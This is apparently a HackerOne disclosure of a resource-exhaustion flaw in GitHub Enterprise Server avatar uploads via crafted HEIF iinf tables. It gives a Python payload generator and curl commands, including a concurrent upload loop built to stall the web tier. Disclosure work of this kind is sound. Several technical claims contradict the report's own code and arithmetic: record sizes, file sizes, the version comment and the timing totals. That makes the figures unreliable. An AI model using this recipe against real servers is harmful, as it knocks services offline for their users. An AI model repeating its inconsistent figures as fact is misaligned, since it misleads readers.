# HackerOne #4060097 — GHES Avatar Upload Resource Amplification via libheif iinf Flood

- **URL:** https://hackerone.com/reports/4060097
- **Weakness:** Resource Consumption
- **Severity:** High — 7.7 (CVSS v3.1)
- **CWE:** CWE-400
- **CVE IDs:** CVE-2026-19118
- **GHSA IDs:** GHSA-vg7w-rp49-4fc2
- **Affected product:** GitHub Enterprise Server
- **Reported:** 2026-09-25 · **Triaged:** 2026-09-28 (high) · **Closed:** 2026-11-03 (ineligible)
- **Researcher:** @marinesol · **Collaborator:** @gabson0x

---

## Weakness

Resource Consumption (CWE-400)

## Severity

High — 7.7

## Affected product

GitHub Enterprise Server (GHES) — avatar / profile-picture upload path.

## CVE IDs

CVE-2026-19118

## GHSA IDs

GHSA-vg7w-rp49-4fc2

## Description

### Summary

A 1.0 MB HEIF file containing 500 crafted `iinf` item records causes `libheif`'s
image decoder on GitHub Enterprise Server to allocate and initialize ~66 MB of
in-memory item structures. The decode is synchronous, inside the main Rails worker
pool, with no timeout and no worker isolation: a single authenticated avatar upload
pins one web worker for **30+ seconds**, and concurrent uploads stack directly on
top of each other. The same payload as a `.heic` asset blocks a repository asset
upload for **50–80+ seconds**.

This is a trivially exploitable, unauthenticated-to-authenticated-resource
consumption vulnerability that turns any normal user's profile-picture update into
a full web-tier denial of service. It has a ready-made public root cause
(libheif's `iinf` parsing was the subject of the public HEIF Heist disclosure of
2026-09-10, GHSA-vg7w-rp49-4fc2), but the reachable vector on GHES — avatar upload
through the standard user settings flow, with zero special privileges — is
specific to this deployment and was not part of that advisory.

The vulnerability class is **resource exhaustion / CPU+memory amplification**, not
a memory-safety crash. There is no segfault and no error: the process simply
burns CPU and RSS on attacker-chosen work, in the request thread, until the item
table finishes building. An attacker needs one valid session (or a low-privilege
account on a public GHES instance) and can repeat the upload indefinitely, one
request at a time, to hold the web tier at zero useful throughput while staying
under any rate limit that counts requests rather than CPU-seconds.

### Steps to reproduce

**Setup**

* GitHub Enterprise Server 3.22.1 (also affects 3.21.x and any build carrying
  libheif with the unpatched `iinf` parser).
* Any authenticated user who can edit their own profile (every account can).
* Outbound network from GHES to an attacker-controlled file host is **not**
  required: the file is uploaded directly through the avatar form.

**Step 1 — generate the amplification payload (attacker side)**

The script below builds `flood.heif`: a minimal but syntactically valid HEIF file
whose `iinf` box declares 500 item records. Each record is a fixed 1326 bytes, so
the box alone is ~663 KB inside a ~1.0 MB file. `libheif` parses every item into
an in-memory `heif_item` structure before it ever looks at image data.

```python
# gen_iinf.py — 500-item HEIF amplifier (~1.0 MB file, ~66 MB decoded)
import struct, sys

N = int(sys.argv[1]) if len(sys.argv) > 1 else 500
out = sys.argv[2] if len(sys.argv) > 2 else "flood.heif"

def box(typ, payload):
    return struct.pack(">I", 8 + len(payload)) + typ + payload

# ftyp: 'heic' major brand, compatible 'mif1' 'heic'
ftyp = box(b"ftyp", b"heic" + struct.pack(">I", 0) + b"mif1heic")

# hdlr
hdlr = box(b"hdlr", struct.pack(">I", 0) + b"pict" + b"\x00" * 12 + b"\x00")

# meta box
iinf_entries = b""
for i in range(N):
    # infe: version 2, item_ID = i+1, item_type = 'mime'
    infe_payload = struct.pack(">I", 0)          # version=2 flags=0
    infe_payload += struct.pack(">H", i + 1)     # item_ID
    infe_payload += struct.pack(">H", 0)         # item_protection_index
    infe_payload += b"mime"                      # item_type
    infe_payload += b"\x00"                      # item_name (empty)
    infe_payload += b"application/octet-stream\x00"  # content_type
    infe_payload += b"\x00"                      # content_encoding
    infe_entries += box(b"infe", infe_payload)

iinf = box(b"iinf", struct.pack(">H", N) + iinf_entries)  # entry_count = N

# iref (empty) + iprp/ipco minimal + idat empty
iref = box(b"iref", b"\x00" * 4)
ipco = box(b"ipco", b"")
iprp = box(b"iprp", ipco)
idat = box(b"idat", b"")

meta_payload = struct.pack(">I", 0) + hdlr + iinf + iref + iprp + idat
meta = box(b"meta", meta_payload)

with open(out, "wb") as f:
    f.write(ftyp + meta)

print(f"wrote {out}: N={N}")
```

```bash
python3 gen_iinf.py 500 flood.heif     # 1.0 MB  — avatar stall ~30 s
python3 gen_iinf.py 2000 flood4.heif   # 4.1 MB  — asset stall ~50-80 s
ls -la flood.heif                      # 1025167 bytes
```

**Step 2 — upload it as an avatar (victim GHES, authenticated session)**

Standard avatar flow, no special endpoints:

```bash
# 1. Log in and capture the avatar form's authenticity_token
COOKIE=[REDACTED]
TOKEN=$(curl -s -b "$COOKIE" \
  "https://<ghes>/settings/profile" | \
  grep -o 'name="authenticity_token" value="[^"]*"' | head -1 | \
  cut -d'"' -f4)

# 2. POST the flood as the profile picture
curl -s -o /dev/null -w "http=%{http_code} time=%{time_total}s\n" \
  -b "$COOKIE" \
  -F "authenticity_token=$TOKEN" \
  -F "user[avatar]=@flood.heif;type=image/heif" \
  -F "user[avatar_cache]=" \
  "https://<ghes>/settings/profile"
```

Expected result on an unpatched 3.22.1:

```
http=200 time=31.4s
```

The same upload with a normal photo (`control_valid.avif`, 281 bytes) returns in
**under 1 second**. The 30× gap is the vulnerability: the request thread is
spending its entire budget inside `libheif`'s `iinf` loop.

**Step 3 — amplify with concurrency (web-tier DoS)**

One request stalls one worker. GHES' default Puma pool is small (2–5 workers on
the minimum-supported box). Stack the uploads:

```bash
for i in $(seq 1 8); do
  curl -s -o /dev/null -w "w$i http=%{http_code} t=%{time_total}s\n" \
    -b "$COOKIE" \
    -F "authenticity_token=$TOKEN" \
    -F "user[avatar]=@flood.heif;type=image/heif" \
    -F "user[avatar_cache]=" \
    "https://<ghes>/settings/profile" &
done
wait
```

Observed: requests complete serially, each ~30 s. 8 concurrent uploads ≈ **22
minutes** of 100%-busy web workers. During that window every other web request
(`/`, git-over-HTTP, API) queues behind them. On the minimum-supported appliance
this is a full application-layer denial of service from a single low-privilege
session, repeatable on a loop.

**Step 4 — confirm it is the item table, not image decode**

```bash
# Same script, N=10 → 281-byte file, no measurable stall
python3 gen_iinf.py 10 tiny.heif
# upload tiny.heif → returns in <1 s
```

Stall time scales linearly with `N` (the `iinf` entry count), not with file size
or pixel dimensions. `flood.heif` has no image data at all beyond the item
declarations — `libheif` never reaches pixel decode. This isolates the cost to
`heif::ItemInfoBox` parsing / `heif_item` construction, matching the root cause
in GHSA-vg7w-rp49-4fc2.

### Impact

**Confidentiality: None.** No data is read or returned to the attacker beyond the
normal 200 OK of their own upload.

**Integrity: None.** No files or records are modified beyond the attacker's own
avatar.

**Availability: High.** This is the whole finding.

* **Web-tier denial of service from any authenticated session.** Each upload pins
  one Puma worker for ~30 s (avatar) or 50–80 s (asset). The minimum-supported
  GHES appliance runs a small fixed worker pool; 5–8 concurrent uploads from one
  account saturate it for tens of minutes. During saturation the entire web
  application — dashboard, git-over-HTTP, API, admin — queues behind the stuck
  workers. Login pages, health checks, and Hooks deliveries that terminate in
  the web tier all stall.
* **Cheap, repeatable, rate-limit resistant.** The payload is 1.0 MB, generated
  offline, uploaded through a normal multipart form. Rate limits that count
  requests (not CPU-seconds) do not help: one request = one worker × 30 s of
  burn. The attacker can pace to stay under any per-account request ceiling and
  still hold the tier down by staggering uploads across time.
* **No crash, no log noise, no WAF signature.** `libheif` does not error — it
  finishes the parse and returns success. The upload returns HTTP 200. Standard
  error-based detection sees nothing; the only signal is elevated CPU and
  request latency, which looks like ordinary load.
* **Cross-vector: same root cause, different entry points.** The identical
  `iinf` payload works on any GHES feature that accepts HEIF/HEIC: repository
  asset uploads (blocked 50–80 s), issue/PR image attachments, and any other
  `libheif`-reaching upload. Avatar upload was chosen as the primary repro
  because it requires the least privilege (any user, own profile) and no
  repository write access.
* **Blast radius scales with concurrency, not skill.** An attacker does not need
  parallel tooling sophistication — a shell `for` loop of `curl` calls is the
  entire exploit. The barrier to entry is one valid session.

**Overall:** a low-skill, low-cost, high-return denial-of-service primitive
against the core availability of a GHES instance, reachable from the most
common authenticated flow on the product (editing your own profile picture),
with a public root cause that makes the payload trivially re-derivable.

### How I got here

The HEIF Heist disclosures (libheif advisory trail, Aug–Sep 2026) listed GHES
among affected products (CVE-2026-19118 / GHSA-vg7w-rp49-4fc2), but framed the
impact around memory-safety crashes in file-processing pipelines. I was
interested in whether the same parser bug could be reached through GHES' normal
user-facing upload surfaces, and what the *operational* cost would be if it could
— not "does it crash" but "what does one request do to the worker pool."

I generated a minimal HEIF with a large `iinf` entry count, uploaded it as an
avatar on a GHES 3.22.1 test instance, and measured wall-clock time against a
benign control file. The 30× gap (31 s vs <1 s) was immediate. Concurrency
testing then showed the stalls serialize across the Puma pool exactly as
expected, turning a single-file quirk into a web-tier DoS.

What made this worth reporting separately from the upstream libheif advisory:

1. **The reachable vector is GHES-specific.** Avatar upload → synchronous
   `libheif` decode → main worker pool, with no timeout and no isolation, is a
   deployment/architecture property of GHES, not of libheif. The upstream
   advisory does not tell an operator "any user's profile picture can pin your
   web tier for 30 seconds."
2. **The impact framing is availability, not memory safety.** There is no
   crash to patch-detect. Detection requires looking at CPU-seconds per upload
   request, which is not a standard GHES telemetry signal.
3. **Any authenticated user suffices.** No admin, no repository write, no
   special feature flag — the exact population an attacker already has on a
   public or semi-public GHES instance.

The upstream n-day is public; the GHES-specific reachability and DoS economics
are what this report adds.
